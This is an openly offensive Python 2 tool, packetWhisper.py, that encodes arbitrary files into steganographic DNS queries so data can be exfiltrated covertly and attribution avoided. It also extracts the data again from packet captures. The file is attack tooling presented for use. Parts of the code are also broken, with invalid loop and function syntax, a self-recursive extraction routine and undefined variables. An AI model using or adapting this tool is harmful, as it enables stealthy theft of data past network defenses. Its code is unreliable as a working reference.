#!/usr/bin/python
# 
# Filename:  packetWhisper.py 
#
# Version: 1.0.0
#
# Author:  Joe Gervais (TryCatchHCF)
#
# Summary:  Combines text-based steganography (via Cloakify) and DNS queries
# to exfiltrate / transfer data to any system that is able to capture a copy
# of the DNS queries along the DNS resolution path. Captured pcap can then be
# loaded into packetWhisper.py, which then extracts the encoded queries and
# restores (Decloakify) the payload.
#
# Primary use cases are defeating attribution (no direct connection to an
# attacker-controlled destination is ever required) and stealthy exfiltration
# when all other services are unavailable.
#
# Description:  
#
# Leverages Cloakify (https://github.com/TryCatchHCF/Cloakify) to turn any
# file type in a list of Fully Qualified Domain Names (FQDNs), selected from
# list of ciphers by the user.
#
# packetWhisper then generates seqential DNS queries for each FQDN, which
# propagates the DNS query along the DNS resolution path.
#
# To capture the data, you just need visibility of the network traffic along 
# the DNS resolution path, which can of course include a simple connected 
# system capturing in promiscuous mode, or access to network appliances along 
# the route, including external to the network / organization of origination.
#
# The captured pcap file is then loaded into packetWhisper, which parses
# the pcap using the matching cipher used to encode during transmission.
# The ciphered data is extracted from the pcap and then Decloakified to 
# restore the file to its original form.
#
# =====  NOTE: VPNs Will Prevent Access To DNS Queries  =====
# 
# If the transmitting system is using a VPN, then none of the DNS queries
# will be available unless your point of capture is upstream from the VPN
# exit node. That's obvious, but it also means if you're testing on your
# own system and running a VPN, you'll be capturing an empty PCAP file.
# Always verify your PCAP capture settings and outputs.
#
# =====  NOTE: NOT A HIGH-BANDWIDTH TRANSFER METHOD  =====
#
# If you have other datapaths available (HTTP outbound, etc.) then just use
# the Cloakify project (GitHub project URL above) and its standard ciphers, 
# transfer normally.

#
# Example:  
#
#   $ python packetWhisper.py 
# 

import os, sys, getopt, socket, random, datetime, cloakify, decloakify, packetWhisperBroadcast, packetWhisperCapture

# Set name of knock sequence string (this is only used when transmitting Common FQDN ciphers)

gKnockSequenceFilename = "knockSequence.txt"
gCommonFQDNCipherSelected = False

# Load lists of FQDN-based ciphers

gRandomSubdomainFQDNCipherFiles = next(os.walk("./ciphers/subdomain_randomizer_scripts/"))[2]
gRepeatedSubdomainFQDNCipherFiles = next(os.walk("./ciphers/repeated_unique_fqdn/"))[2]
gCommonFQDNCipherFiles = next(os.walk("./ciphers/common_fqdn"))[2]

# Load list of FQDN Subdomain Randomizer scripts

gSubdomainRandomizerScripts = []
for root, dirs, files in os.walk( "./ciphers/subdomain_randomizer_scripts/" ):
        for file in files:
                if file.endswith('.py'):
                        gSubdomainRandomizerScripts.append( file )


#========================================================================
#
# CloakAndTransferFile()
# 
# High-level coordination function for encoding and transferring the 
# selected file.
# 
#========================================================================

def CloakAndTransferFile():

	# Reset this each time we pass through
	gCommonFQDNCipherSelected = False

	# Perform payload selection, cipher selection, Cloakify the payload into FQDNs
	cloakedFile = SelectCipherAndCloakifyFile()

	choice = raw_input( "Press return to continue... " )
	print ""

	choice = raw_input( "Begin PacketWhisper transfer of cloaked file? (y/n): " )

	if choice == "y":

		### Send knock sequence if Common FQDN cipher used
		### Signals beginning of cloaked file in pcap (need source's IP address)

		if ( gCommonFQDNCipherSelected == True ):

			TransferCloakedFile( gKnockSequenceFilename )

		TransferCloakedFile( cloakedFile )

		### Send knock sequence if Common FQDN cipher used
		### Signals end of cloaked file in pcap

		if ( gCommonFQDNCipherSelected == True ):

			TransferCloakedFile( gKnockSequenceFilename )

	choice = raw_input( "Press return to continue... " )
	print ""

	return


#========================================================================
#
# SelectCipherAndCloakifyFile()
# 
# Walks user through the process of selecting payload file, Cloakify cipher
# to use, and then Cloakifies the payload into a list of FQDNs.
#
#========================================================================

def SelectCipherAndCloakifyFile():

	print ""
	print "====  Prep For DNS Transfer - Cloakify a File  ===="
	print ""

	notDone = True

	while ( notDone ):

		sourceFile = raw_input("Enter filename to cloak (e.g. ImADolphin.exe or /foo/bar.zip): ")

		if ( sourceFile != "" ):
			notDone = False

		else:
			print ""
			print "!!! Filename required, try again."
			print ""

	print ""

	cloakedFile = raw_input("Save cloaked data to filename (default: 'tempFQDNList.txt'): ")

	if cloakedFile == "":
		cloakedFile = "tempFQDNList.txt"

	print ""
	print "====  Prep For DNS Transfer - Select Cloakify cipher  ===="
	print ""

	cipherFilePath = SelectPacketWhisperMode( sourceFile, cloakedFile )

	print ""
	choice = raw_input( "Preview a sample of cloaked file? (y/n): " )

	if choice == "y":
		print ""
		with open( cloakedFile ) as file:
			cloakedPreview = file.readlines()
			i = 0;
			while ( i < len( cloakedPreview )) and ( i<20 ):
				print cloakedPreview[ i ],
				i = i+1
		print ""

	return( cloakedFile )



#========================================================================
# 
# CloakifyPayload( sourceFile, cloakedFile, cipherFilePath )
# 
# Helper method to invoke Cloakify().
#
#========================================================================

def CloakifyPayload( sourceFile, cloakedFile, cipherFilePath ):

	print ""
	print "Creating cloaked file using cipher:", cipherFilePath

	try:
		cloakify.Cloakify( sourceFile, cipherFilePath, cloakedFile )

	except:
		print ""
		print "!!! Well that didn't go well. Verify that your cipher is in the 'ciphers/' subdirectory."
		print ""

	print ""
	print "Cloaked file saved to:", cloakedFile
	print ""

	return


#========================================================================
#
# SelectPacketWhisperMode( sourceFile, cloakedFile )
# 
# Walks user through the selection of the cipher to use for Cloakifying
# the payload.
#
#========================================================================

def SelectPacketWhisperMode( sourceFile, cloakedFile ):

	selectionErrorMsg = "1-5 are your options. Try again."
	cipherFilePath = ""
	notDone = 1

	while ( notDone ): 

		print ""
		print "=======  Select PacketWhisper Transfer Mode  ======="
		print ""
		print "1) Random Subdomain FQDNs  (Recommended - avoids DNS caching, overcomes NAT)"
		print "2) Unique Repeating FQDNs  (DNS may cache, but overcomes NAT)"
		print "3) Common Website FQDNs    (DNS caching may block, NAT interferes)"
		print "4) Help"
		print "5) Exit"
		print ""
	
		invalidSelection = 1
	
		while ( invalidSelection ):
			try:
				choice = int( raw_input( "Selection: " ))
	
				if ( choice > 0 and choice < 6 ):
					invalidSelection = 0
				else:
					print selectionErrorMsg
	
			except ValueError:
				print selectionErrorMsg
	
		if choice == 1:
			cipherFilePath = SelectAndGenerateRandomFQDNs( sourceFile, cloakedFile )
			notDone = 0
		elif choice == 2:
			cipherFilePath = SelectAndGenerateUniqueRepeatingFQDNs( sourceFile, cloakedFile )
			notDone = 0
		elif choice == 3:
			cipherFilePath = SelectAndGenerateCommonWebsiteFQDNs( sourceFile, cloakedFile )
			notDone = 0
		elif choice == 4:
			ModeHelp()
		elif choice == 5:
			cipherFilePath = ""
			notDone = 0
		else:
			print selectionErrorMsg

	return cipherFilePath


#========================================================================
#
# ModeHelp()
#
# Because context-relevant help is always nice.
#
#========================================================================

def ModeHelp():

	print ""
	print ""
	print "==========  Help: Select PacketWhisper Transfer Mode  =========="
	print ""
	print "==== Unique Random Subdomain FQDNs ===="
	print ""
	print "*** RECOMMENDED CIPHER MODE - FOR MOST USE CASES"
	print ""
	print "FQDNs with random subdomains help prevent DNS caching, while also able"
	print "to transfer data beyond a NAT'd network device being, since the sending"
	print "system's IP address isn't needed to identify the traffic."
	print ""
	print "These ciphers mimic the formats of various services that rely on" 
	print "complex subdomains as a means to identify a session, user, cached"
	print "content etc."
	print ""
	print "The first part of the subdomain name is actually a string from the cipher" 
	print "list. The rest of the subdomain name is randomized to make each FQDN unique,"
	print "which prevents DNS caching from shutting down the DNS query path prematurely."
	print "We then add the domain name. We construct the FQDNs this way to look like"
	print "the usual FQDNs associated with the selected domain, to blend in better"
	print "with normal webtraffic seen on any network."
	print ""
	print "Example:  d1z2mqljlzjs58.cloudfront.net"
	print ""
	print ""
	print "==== Unique Repeating FQDNs ===="
	print ""
	print "Created to stand out from all other DNS queries on the network, but"
	print "without any randomization involved. This means that DNS caching may"
	print "interfere, but as a side benefit you're DNS queries will be easy for"
	print "you to find in even the largest collection of multi-client pcaps."
	print "This is due to the fact that the FQDNs are odd endpoints, like the"
	print "list of Johns (Red Lectroid aliens) at the fictional Yoyodyne Propulsion"
	print "Systems from the movie 'Buckaroo Banzai Across the 8th Dimension'."
	print ""
	print "Example:  John.Whorfin.yoyodyne.com"
	print ""
	print ""
	print "==== Common Website FQDNs ===="
	print ""
	print "FQDNs constructed out of the most common Website URLs."
	print ""
	print "NOTE: Since most environments are NAT'd at the perimeter (removing "
	print "visibility of client's IP address), this mode is generally only useful"
	print "for transferring data between systems connected to the same /24 local "
	print "network (for example, the guest wifi at your favorite coffee shop"
	print ""
	print "Since Common Website ciphers only have the source IP address as a way"
	print "to identify its queries from all the others on the network, I set "
	print "gCommonFQDNCipherSelected to True so that the code will transmit the"
	print "knock sequence at beginning and end of payload, helps us pick out the"
	print "transmitting host from the pcap later."
	print ""
	print "Example:  www.github.com"
	print ""
	print ""

	return


#========================================================================
#
# SelectAndGenerateRandomFQDNs( sourceFile, cloakedFile )
#
# If user selected Random Subdomian FQDNs, Cloakify with the matching
# cipher, then invoke the matching Python script that adds the appropriate
# random noise to complete the rest of the subdomain associated with the
# domain in the FQDN.
#
#========================================================================

def SelectAndGenerateRandomFQDNs( sourceFile, cloakedFile ):

	cipherNum = SelectCipher( gRandomSubdomainFQDNCipherFiles )

	cipherFilePath = "ciphers/subdomain_randomizer_scripts/" + gRandomSubdomainFQDNCipherFiles[ cipherNum ] 

	CloakifyPayload( sourceFile, cloakedFile, cipherFilePath )

	### Payload is now Cloaked, time to build the rest of the FQDN
	###
	### The corresponding script is the cipher's name with ".py" suffix added to it
	###
	### This makes me feel so unclean. There is not enough soap to rinse it away
	###
	### "Mediocrity, I am your King!"
	###
	### However it's a really convenient way to correlate the cipher with its matching
	### script. And now I must accept the fact that there's a brittle connection between
	### the cipher's filename and the matching script filename. 

	scriptFilename = gRandomSubdomainFQDNCipherFiles[ cipherNum ] + ".py"

	print "Adding subdomain randomization to cloaked file using :", scriptFilename

	try:
		os.system( "ciphers/subdomain_randomizer_scripts/%s %s %s" % ( scriptFilename, cloakedFile, "True" ))

	except:
		print ""
		print "!!! Well that didn't go well. Verify that '", cloakedFile, "'"
		print "!!! is in the current working directory or try again giving full filepath."
		print ""

	return( cipherFilePath )


#========================================================================
#
# SelectAndGenerateUniqueRepeatingFQDNs( sourceFile, cloakedFile )
#
# Just a straightforward call to Cloakify with the matchin cipher name.
#
#========================================================================

def SelectAndGenerateUniqueRepeatingFQDNs( sourceFile, cloakedFile ):

	cipherNum = SelectCipher( gRepeatedSubdomainFQDNCipherFiles )

	cipherFilePath = "ciphers/repeated_unique_fqdn/" + gRepeatedSubdomainFQDNCipherFiles[ cipherNum ] 

	CloakifyPayload( sourceFile, cloakedFile, cipherFilePath )

	return( cipherFilePath )


#========================================================================
#
# SelectAndGenerateCommonWebsiteFQDNs( sourceFile, cloakedFile )
#
# Just a straightforward call to Cloakify with the matchin cipher name.
#
# Since Common Website ciphers only have the source IP address as a way
# to identify its queries from all the others on the network, I set 
# gCommonFQDNCipherSelected to True so that the code will transmit the
# knock sequence at beginning and end of payload, helps us pick out the
# transmitting host from the pcap later.
#
# Note: Since most environments are NAT'd at the perimeter (removing 
# client's IP information), this mode is generally only useful for 
# transferring data between systems connected to the same /24 local 
# subnetwork.
#
#========================================================================

def SelectAndGenerateCommonWebsiteFQDNs( sourceFile, cloakedFile ):

	cipherNum = SelectCipher( gCommonFQDNCipherFiles )

	cipherFilePath = "ciphers/common_fqdn/" + gCommonFQDNCipherFiles[ cipherNum ] 

	CloakifyPayload( sourceFile, cloakedFile, cipherFilePath )

	gCommonFQDNCipherSelected = True

	return( cipherFilePath )


#========================================================================
#
# TransferCloakedFile( cloakedFile )
#
# Calls packetWhisperBroadcast.PacketWhisperBroadcast() to submit sequential
# DNS queries for each FQDN in the Cloaked file.
#
# Adds UTC datetimestamps before and after completion, can help identify
# where in the pcap to look for info if you're capturing large volumes of
# traffic.
#
#========================================================================

def TransferCloakedFile( cloakedFile ):

	print ""
	print "Broadcasting file..."
	print ""
	mDateTimeUTC = datetime.datetime.utcnow()

	print "### Starting Time (UTC): " + mDateTimeUTC.strftime( "%x %X" )
	print ""

	status = packetWhisperBroadcast.PacketWhisperBroadcast( cloakedFile )

	mDateTimeUTC = datetime.datetime.utcnow()

	print ""
	print "### Ending Time (UTC): " + mDateTimeUTC.strftime( "%x %X" )
	print ""

	if ( status > 0 ):

		print "File transferred."

	else:
		print "File transfer failed."

	print ""

	return


## !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
## CRITICAL NOTE: USE DNS QUERY'S "Transaction ID: 0xda90" TO STRIP DUPLICATE REQUESTS
## !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!

#========================================================================
#
# ExtractFileFromPCAP( pcapFile, osStr )
#
#
#
#========================================================================

def ExtractFileFromPCAP( pcapFile, osStr ):

	dnsQueriesFilename = "dnsQueries.txt"

	if ( osStr == "Linux" ):

		commandStr = "tcpdump -r " + pcapFile + " udp port 53 | grep -E 'A\?' > " + dnsQueriesFilename

		os.system( commandStr )

	elif ( osStr == "Windows" ):

		### WARNING - Will fail in testing, just a placeholder for now - no default grep installed in Windows
		### May have to instead add "A?" as an additional cipher tag match candidate

		commandStr = "windump -r " + pcapFile + " udp port 53 | grep -E 'A\?' > " + dnsQueriesFilename

		os.system( commandStr )

	else:
		print "!!! Error: Unknown OS received by ExtractFileFromPCAP(), this shouldn't have happened. Oops."


	return dnsQueriesFilename



#========================================================================
#
# ExtractPayloadFromDNSQueries( dnsQueriesFile, cipherFile, cipherTag )
#
# cipherTag is the unique element association with some ciphers. For 
# Random Subdomain FQDN ciphers it's the domain name. For Common FQDNs
# it's the source IP address associated with the knock sequence. It
# provides additional context when extracting cipher strings from a
# pcap file, which reduces the risk of false matches corrupting results.
#
#========================================================================

def ExtractPayloadFromDNSQueries( dnsQueriesFilename, cipherFilename, cipherTag ):

	cloakedFilename = "cloaked.payload"

	try:
		with open( dnsQueriesFilename ) as queriesFile:
    			queries = queriesFile.readlines()
	except:
		print ""
		print "!!! Oh noes! Problem reading '", dnsQueriesFile, "'"
		print "!!! Verify the location of the cipher file" 
		print ""
		return

	try:
		with open( cipherFilename ) as cipherFile:
    			cipherStrings = queriesFile.readlines()
	except:
		print ""
		print "!!! Oh noes! Problem reading '", cipherFilename, "'"
		print "!!! Verify the location of the cipher file" 
		print ""
		return

	try:
		cloakedFile = open( cloakedFilename, "w" ) 
	except:
		print ""
		print "!!! Oh noes! Problem reading '", cloakedFile, "'"
		print "!!! Verify the location of the cipher file" 
		print ""
		return


	# Activate "Elegance Mode" here - We don't have to extract the cipher
	# string from the DNS query. Instead, we only need to know that a 
	# cipher string *appears* in the query. Then we can simply add the 
	# corresponding cipher string to the cloaked payload file, because
	# inference. \o/

	for ( dnsQuery in dnsQueriesFile ):
		for ( cipherElement in cipherFile ):
			if ( cipherElement in dnsQuery ):
				if ( cipherTag == "" ) or ( cipherTag in dnsQuery ):
					cloakedFile.write( cipherElement )

	queriesFile.close()
	cipherFile.close()
	cloakedFile.close()

	return cloakedFilename


#========================================================================
#
# ExtractCapturedPayload( pcapFile )
#
#
#
#========================================================================

def ExtractCapturedPayload( pcapFile ):

	cloudfrontStr = "cloudfront.net"
	akstatStr = "akstat.io"
	optimizelyStr = "optimizely.com"
	commonFQDNStr = "common"

	pcapTextFilename = "tempPcapFile.txt"

	#DEBUG
	osStr = "Linux"

	print ""
	print "====  Extract & Decloakify a Cloaked File  ===="
	print ""
	pcapFile = raw_input( "Enter PCAP filename: " )
	print ""

	cipherFilePath = ExtractCapturedPayload( pcapFile )
	dnsQueriesFilename = ExtractFileFromPCAP( pcapFile, osStr );

	cipherNum = SelectCipher( gRandomSubdomainFQDNCipherFiles )

	cipherFilePath = "ciphers/subdomain_randomizer_scripts/" + gRandomSubdomainFQDNCipherFiles[ cipherNum ] 

	print "Extracting payload from PCAP using cipher:", scriptFilename

	# cipherTag is extra identifying information associated with an FQDN cipher.
	# Necessary in cases where there is a risk of duplicate substrings in the
	# pcap file that aren't actually part of a PacketWhisper cipher, usually
	# due to bad luck or using the Common Domains cipher.

	cipherTag = ""

	# For Random Subdomain FQDN ciphers, use the base domain name as extra filter

	if ( akstatStr in cipherFilePath ):
		cipherTag = akstatStr;

	elif ( cloudfrontStr in cipherFilePath ):
		cipherTag = cloudfrontStr;

	elif ( optimizelyStr in cipherFilePath ):
		cipherTag = optimizelyStr;

	elif ( commonFQDNStr in cipherFilePath ):
		cipherTag = commonFQDNStr


	# If it's a Common FQDN cipher, we have to use the embedded knock sequence
	# to determine the correct source IP address amidst a possible sea of 
	# duplicate requests. New cipherTag will be the source IP address of the
	# knock sequence in pcap.

	if ( cipherTag == commonFQDNStr ):

		cipherTag = GetSourceIPViaKnockSequence( dnsQueriesFilename )

		if ( cipherTag == "" ):
			print ""
			print "!!! Error: Common FQDN cipher selected, but knock sequence not found"
			print "!!!        in PCAP file. Unable to determine which DNS queries are"
			print "!!!        from the PacketWhisper client."
			print ""

			return

	cloakedFile = ExtractPayloadFromDNSQueries( dnsQueriesFilename, cipherFilePath, cipherTag )

	# Decloakify file

	DecloakifyFile( cloakedFile, cipherFilePath )

	return



#========================================================================
#
# GetSourceIPViaKnockSequence( dnsQueriesFile )
#
# 
#========================================================================

GetSourceIPViaKnockSequence( dnsQueriesFilename ):

	# WARNING: This is a duplicate hardcoded value of the string found
	# in the file 'knockSequence.txt'. This is unclean. It will be fixed.

	knockSequenceStr = "camembert.google.com"

	sourceIPAddrStr = ""

	try:
		with open( dnsQueriesFilename ) as queriesFile:
    			queries = queriesFile.readlines()
	except:
		print ""
		print "!!! Oh noes! Problem reading '", dnsQueriesFile, "'"
		print "!!! Verify the location of the cipher file" 
		print ""
		return

	for ( dnsQuery in queries )

		if ( knockSequenceStr in dnsQuery ):

			# Extract substring containing source IP address
			# DEBUG
			print dnsQuery

	queriesFile.close()
	
	return sourceIPAddrStr



#========================================================================
#
# DecloakifyFile( cloakedFile, cipherFilePath )
#
# 
#========================================================================

def DecloakifyFile( cloakedFile, cipherFilePath ):

	decloakTempFile = "decloakTempFile.txt"

	decloakedFile = raw_input( "Save decloaked data to filename (default: 'decloaked.file'): " )
	print ""

	if decloakedFile == "":
		decloakedFile = "decloaked.file"

	try:
		decloakify.Decloakify( cloakedFile, cipherFilePath, decloakedFile )

		print ""
		print "File", cloakedFile, "decloaked and saved to", decloakedFile
	except:
		print ""
		print "!!! Oh noes! Error decloaking file (did you select the same cipher it was cloaked with?)"
		print ""

	choice = raw_input("Press return to continue... ")

	return


#========================================================================
#
# TestDNSAccess()
#
# "Lame function of lameness!" you declare. You're not wrong, but sometimes
# it's nice to check things from within the user interface. Also, since it's
# part of the UI, it reminds the user that, yes, there's a chance DNS
# queries won't get far (network is down, etc.).
#
#========================================================================

def TestDNSAccess():
	
	defaultFQDNStr = "www.google.com"
	addr = ""

	print ""
	testFQDNStr = raw_input("Enter domain name / FQDN to query for (default=www.google.com): ")
	print ""

	if testFQDNStr == "":
		testFQDNStr = defaultFQDNStr

	try:
		#addr = socket.gethostbyname( testFQDNStr )

		commandStr = "nslookup " + testFQDNStr

		os.system( commandStr )

		if addr == "":
			print "!!! Warning: Not able to resolve hostname " + testFQDNStr
			print ""
			print "!!! Outgoing DNS queries may be blocked. If so, PacketWhisper transfer will fail."
			print ""
		else:
			print testFQDNStr + " resolved to " + addr
			print ""
			print "DNS queries are open, PacketWhisper should be able to transfer data."
			print ""

	except:
		print "!!! Warning: Not able to resolve hostname " + testFQDNStr
		print ""
		print "!!! Outgoing DNS queries may be blocked. If so, PacketWhisper transfer will fail."
		print ""

	choice = raw_input("Press return to continue... ")


#========================================================================
#
# SelectCipher( cipherFiles )
#
# Helper method to prompt the user to select from a list of available
# ciphers. 
#
#========================================================================

def SelectCipher( cipherFiles ):
	print ""
	print "Ciphers:"
	print ""

	cipherCount = 1

	for cipherName in cipherFiles:
		print cipherCount, "-", cipherName
		cipherCount = cipherCount + 1
	print ""

	selection = -1

	while ( selection < 0 or selection > (cipherCount - 2)):
		try:
			cipherNum = raw_input( "Enter cipher #: " )

			selection = int ( cipherNum ) - 1

			if ( cipherNum == "" or selection < 0 or selection > (cipherCount - 1)): 
				print "Invalid cipher number, try again..." 
				selection = -1
	
		except ValueError:
			print "Invalid cipher number, try again..."
	print ""
	return selection



#========================================================================
#========================================================================

def Help():

	PrintBanner()

	print ""
	print ""
	print "=====================  Using PacketWhisper  ====================="
	print ""

	print "Summary:  Combines text-based steganography (via Cloakify) and DNS queries"
	print "to exfiltrate / transfer data to any system that is able to capture a copy"
	print "of the DNS queries along the DNS resolution path. Captured pcap can then be"
	print "loaded into packetWhisper.py, which then extracts the encoded queries and"
	print "restores (Decloakify) the payload."
	print ""
	print "Primary use cases are defeating attribution (no direct connection to an"
	print "attacker-controlled destination is ever required) and stealthy exfiltration"
	print "when all other services are unavailable."
	print ""
	print "Description:"
	print ""
	print "Leverages Cloakify (https://github.com/TryCatchHCF/Cloakify) to turn any"
	print "file type in a list of Fully Qualified Domain Names (FQDNs), selected from"
	print "list of ciphers by the user."
	print ""
	print "packetWhisper then generates seqential DNS queries for each FQDN, which"
	print "propagates the DNS query along the DNS resolution path."
	print ""
	print "To capture the data, you just need visibility of the network traffic along"
	print "the DNS resolution path, which can of course include a simple connected"
	print "system capturing in promiscuous mode, or access to network appliances along"
	print "the route, including external to the network / organization of origination."
	print ""
	print "The captured pcap file is then loaded into packetWhisper, which parses"
	print "the pcap using the matching cipher used to encode during transmission."
	print "The ciphered data is extracted from the pcap and then Decloakified to"
	print "restore the file to its original form."
	print ""
	print "=====  NOTE: NOT A HIGH-BANDWIDTH TRANSFER METHOD  ====="
	print ""
	print "If you have other datapaths available (HTTP outbound, etc.) then just use"
	print "the Cloakify project (GitHub project URL above) and its standard ciphers,"
	print "transfer normally."
	print ""

	ModeHelp()

	return()
	

#========================================================================
#
# PrintBanner()
#
#========================================================================

def PrintBanner():

	print "  _____           _        ___          ___     _                      "
	print " |  __ \         | |      | \ \        / / |   (_)                     "
	print " | |__) |_ _  ___| | _____| |\ \  /\  / /| |__  _ ___ _ __   ___ _ __  "
	print " |  ___/ _` |/ __| |/ / _ \ __\ \/  \/ / | '_ \| / __| '_ \ / _ \ '__| "
	print " | |  | (_| | (__|   <  __/ |_ \  /\  /  | | | | \__ \ |_) |  __/ |    "
	print " |_|   \__,_|\___|_|\_\___|\__| \/  \/   |_| |_|_|___/ .__/ \___|_|    "
	print "                                                     | |               "
	print "                                                     |_|               "
	print ""
	print "           Exfiltrate / Transfer Any Filetype in Plain Sight"
	print "                                  via                 "
	print "                 Text-Based Steganograhy & DNS Queries"
	print "\"SHHHHHHHHHH!\""
	print "        \                Written by TryCatchHCF"
	print "         \           https://github.com/TryCatchHCF"
	print "  (\~---."
	print "  /   (\-`-/)"
	print " (      ' '  )         data.xls image.jpg  \\     Series of "
	print "  \ (  \_Y_/\\    ImADolphin.exe backup.zip  -->  harmless-looking "
	print "   \"\"\ \___//         LoadMe.war file.doc  /     DNS queries "
	print "      `w   \""   

	return


#========================================================================
#
# MainMenu()
#
# It just wouldn't be a proper tool without an ASCII splash menu.
#
#========================================================================

def MainMenu():

	PrintBanner()

	selectionErrorMsg = "1-5 are your options. Try again."
	notDone = 1

	while ( notDone ): 

		print ""
		print "====  Packet Main Menu  ===="
		print ""
		print "1) Transmit File via DNS"
		print "2) Extract File from PCAP"
		print "3) Test DNS Access"
		print "4) Help / About"
		print "5) Exit"
		print ""
	
		invalidSelection = 1
	
		while ( invalidSelection ):
			try:
				choice = int( raw_input( "Selection: " ))
	
				if ( choice > 0 and choice < 6 ):
					invalidSelection = 0
				else:
					print selectionErrorMsg
	
			except ValueError:
				print selectionErrorMsg
	
		if choice == 1:
			CloakAndTransferFile()
		elif choice == 2:
			ExtractCapturedPayload()
		elif choice == 3:
			TestDNSAccess()
		elif choice == 4:
			Help()
		elif choice == 5:
			notDone = 0
		else:
			print selectionErrorMsg
	
	# Wherever you are on this floating space orb we call home, I hope you are well

	byeArray = ("Bye!", "Ciao!", "Adios!", "Aloha!", "Hei hei!", "Bless bless!", "Hej da!", "Tschuss!", "Adieu!", "Cheers!")

	print ""
	print random.choice( byeArray )
	print ""


# ==============================  Main Loop  ================================
#
MainMenu()
